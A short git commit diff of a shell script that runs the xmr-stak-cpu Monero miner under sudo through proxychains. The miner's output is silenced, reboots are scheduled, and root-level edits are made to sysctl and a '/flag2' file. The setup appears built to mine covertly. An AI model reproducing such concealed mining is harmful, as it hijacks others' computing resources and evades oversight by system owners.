17d8f24f2822bf9ed79fd1a0285bda9963e0a03c
smithinoz <smithinoz@users.noreply.github.com>
2017-06-21 15:01:33 +1000

    Update g.sh

--- g.sh
+++ g.sh
@@ -24,7 +24,7 @@ then
        ( sleep 3600 ; sudo reboot ) 
 	cd /m/test01/xmr-stak-cpu/bin
         sudo /m/test01/proxychains-ng/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmr-stak-cpu/bin/xmr-stak-cpu >/dev/null 2>&1
-        sudo reboot   
+ #       sudo reboot   
 else
         sudo /bin/su -c "echo 'vm.nr_hugepages=128' >> /etc/sysctl.conf"
         sudo /bin/su -c "echo 'xxxxx' >> /flag2"
